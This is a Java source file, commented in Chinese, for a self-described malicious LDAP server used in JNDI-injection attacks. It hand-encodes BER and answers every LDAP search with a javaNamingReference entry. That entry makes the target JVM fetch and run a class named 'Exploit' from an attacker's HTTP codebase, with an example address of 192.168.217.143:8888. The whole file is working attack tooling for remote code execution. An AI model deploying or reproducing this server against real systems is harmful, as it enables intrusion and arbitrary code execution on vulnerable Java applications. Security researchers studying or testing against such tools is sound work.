import java.io.*;
import java.net.*;

/**
 * 恶意 LDAP 服务器
 * 
 * 走 TCP + BER 编码
 * 实现了对任何 SearchRequest 都返回一条 javaNamingReference 记录，引导目标 JVM 从攻击机 HTTP codebase 远程加载类
 * 报文结构使用 ASN.1 BER 和 TLV 嵌套
 */
public class MaliciousLDAPServer {

    /** BER 长度编码：<128 短格式单字节；否则 0x81/0x82 长格式 */
    static byte[] berLen(int n) {
        if (n < 128) {
            return new byte[]{(byte) n};
        } else if (n < 256) {
            return new byte[]{(byte) 0x81, (byte) n};
        } else if (n < 65536) {
            return new byte[]{(byte) 0x82, (byte) (n >> 8), (byte) n};
        }
        throw new IllegalArgumentException("BER length too long: " + n);
    }

    //TLV：tag 、length 、value ，层层嵌套
    static byte[] seq(int tag, byte[] content) {
        byte[] len = berLen(content.length);
        byte[] out = new byte[1 + len.length + content.length];
        out[0] = (byte) tag;
        System.arraycopy(len, 0, out, 1, len.length);
        System.arraycopy(content, 0, out, 1 + len.length, content.length);
        return out;
    }

    static byte[] octetString(String s) {
        try {
            return seq(0x04, s.getBytes("UTF-8"));
        } catch (UnsupportedEncodingException e) {
            throw new RuntimeException(e);
        }
    }

    static byte[] enumerated(int v) {
        return new byte[]{(byte) 0x0A, 0x01, (byte) v};
    }

    static byte[] attr(String type, String... values) {
        ByteArrayOutputStream vals = new ByteArrayOutputStream();
        for (String v : values) {
            write(vals, octetString(v));
        }
        ByteArrayOutputStream a = new ByteArrayOutputStream();
        write(a, octetString(type));
        write(a, seq(0x31, vals.toByteArray()));
        return seq(0x30, a.toByteArray());
    }

    static byte[] ldapMessage(int msgId, byte[] op) {
        ByteArrayOutputStream body = new ByteArrayOutputStream();
        body.write(0x02); body.write(0x01); body.write(msgId);   // INTEGER
        write(body, op);
        return seq(0x30, body.toByteArray());
    }

    /**
     * SearchResultEntry：核心应答，把 LDAP 条目描述成 Java 命名引用
     */
    static byte[] searchResultEntry(String className, String codebase) {
        ByteArrayOutputStream attrs = new ByteArrayOutputStream();
        write(attrs, attr("objectClass", "javaNamingReference"));
        write(attrs, attr("javaClassName", className));
        write(attrs, attr("javaCodeBase", codebase));
        write(attrs, attr("javaFactory", className));
        ByteArrayOutputStream body = new ByteArrayOutputStream();
        body.write(0x04); body.write(0x00);                      // objectName = ""
        write(body, seq(0x30, attrs.toByteArray()));
        return seq(0x64, body.toByteArray());                    // 0x64 = SearchResultEntry
    }

    static byte[] searchResultDone() {
        return new byte[]{(byte) 0x65, 0x07, 0x0A, 0x01, 0x00, 0x04, 0x00, 0x04, 0x00};
    }

    /** BindResponse：success */
    static byte[] bindResponse() {
        return new byte[]{(byte) 0x61, 0x07, 0x0A, 0x01, 0x00, 0x04, 0x00, 0x04, 0x00};
    }

    private static void write(ByteArrayOutputStream out, byte[] b) {
        out.write(b, 0, b.length);
    }

    //BER 解码器（读客户端消息）

    /** 读一条完整 LDAPMessage；连接关闭后返回 null */
    static byte[] readMessage(InputStream in) throws IOException {
        int tag = in.read();
        if (tag < 0) {
            return null;
        }
        int first = in.read();
        if (first < 0) {
            return null;
        }
        int numLenBytes;
        int length;
        if ((first & 0x80) == 0) {          // 短格式
            numLenBytes = 0;
            length = first;
        } else {                            // 长格式
            numLenBytes = first & 0x7F;
            length = 0;
            for (int i = 0; i < numLenBytes; i++) {
                length = (length << 8) | in.read();
            }
        }
        byte[] body = new byte[length];
        int off = 0;
        while (off < length) {
            int n = in.read(body, off, length - off);
            if (n < 0) {
                return null;
            }
            off += n;
        }
        // 重建原始消息字节
        byte[] msg = new byte[2 + numLenBytes + length];
        msg[0] = (byte) tag;
        if (numLenBytes == 0) {
            msg[1] = (byte) length;
        } else {
            msg[1] = (byte) (0x80 | numLenBytes);
            int l = length;
            for (int i = numLenBytes; i >= 1; i--) {
                msg[1 + i] = (byte) (l & 0xFF);
                l >>= 8;
            }
        }
        System.arraycopy(body, 0, msg, 2 + numLenBytes, length);
        return msg;
    }

    /** 解析 messageID */
    static int parseMsgId(byte[] msg) {
        int i = msg[1] >= 0 ? 1 : 1 + (msg[1] & 0x7F);   // 长度字段结束位置
        int idLen = msg[i + 2];
        int id = 0;
        for (int j = 0; j < idLen; j++) {
            id = (id << 8) | (msg[i + 3 + j] & 0xFF);
        }
        return id;
    }

    /** 解析协议操作标签（msgId 之后的第一个字节） */
    static int parseOpTag(byte[] msg) {
        int i = msg[1] >= 0 ? 1 : 1 + (msg[1] & 0x7F);
        int idLen = msg[i + 2];
        return msg[i + 3 + idLen] & 0xFF;
    }

    //连接处理

    /** 单连接协议循环：bind → search → unbind */
    static void handleConnection(Socket sock, String codebase, String className) {
        try (Socket s = sock;
             InputStream in = s.getInputStream();
             OutputStream out = s.getOutputStream()) {
            s.setSoTimeout(8000);
            while (true) {
                byte[] msg = readMessage(in);
                if (msg == null) {
                    return;
                }
                int msgId = parseMsgId(msg);
                int op = parseOpTag(msg);
                if (op == 0x60) {                                  // BindRequest
                    System.out.println("[+] BindRequest -> BindResponse");
                    out.write(ldapMessage(msgId, bindResponse()));
                    out.flush();
                } else if (op == 0x63) {                           // SearchRequest
                    System.out.println("[+] SearchRequest -> javaNamingReference"
                            + " (codeBase=" + codebase + ")");
                    out.write(ldapMessage(msgId, searchResultEntry(className, codebase)));
                    out.write(ldapMessage(msgId, searchResultDone()));
                    out.flush();
                } else if (op == 0x42) {                           // UnbindRequest
                    System.out.println("[+] UnbindRequest, closing");
                    return;
                } else {
                    out.write(ldapMessage(msgId, searchResultDone()));
                    out.flush();
                }
            }
        } catch (IOException e) {
            // // 客户端正常断开连接
        }
    }


    /**
     * 启动恶意 LDAP 服务器
     *
     * @param port      监听端口（1389）
     * @param codebase  攻击机 HTTP 地址，如 http://192.168.217.143:8888/
     * @param className 恶意类名（Exploit）
     * @return ServerSocket（可用 close() 停止服务）
     */
    public static ServerSocket start(int port, String codebase, String className) throws IOException {
        if (!codebase.endsWith("/")) {
            codebase += "/";
        }
        final String cb = codebase;     
        ServerSocket server = new ServerSocket(port);
        System.out.println("[*] Malicious LDAP server on 0.0.0.0:" + port
                + "  (codeBase=" + codebase + ")");
        new Thread(() -> {
            while (true) {
                try {
                    Socket sock = server.accept();
                    final Socket conn = sock;   
                    new Thread(() -> handleConnection(conn, cb, className)).start();
                } catch (IOException e) {
                    return;
                }
            }
        }).start();
        return server;
    }

    public static void main(String[] args) throws Exception {
        if (args.length < 2) {
            System.err.println("usage: java MaliciousLDAPServer <port> <codebase> [className]");
            System.err.println("  e.g. java MaliciousLDAPServer 1389 http://192.168.217.143:8888/");
            System.exit(2);
        }
        int port = Integer.parseInt(args[0]);
        String className = args.length > 2 ? args[2] : "Exploit";
        start(port, args[1], className);
        Thread.sleep(Long.MAX_VALUE);      // 保持进程存活
    }
}
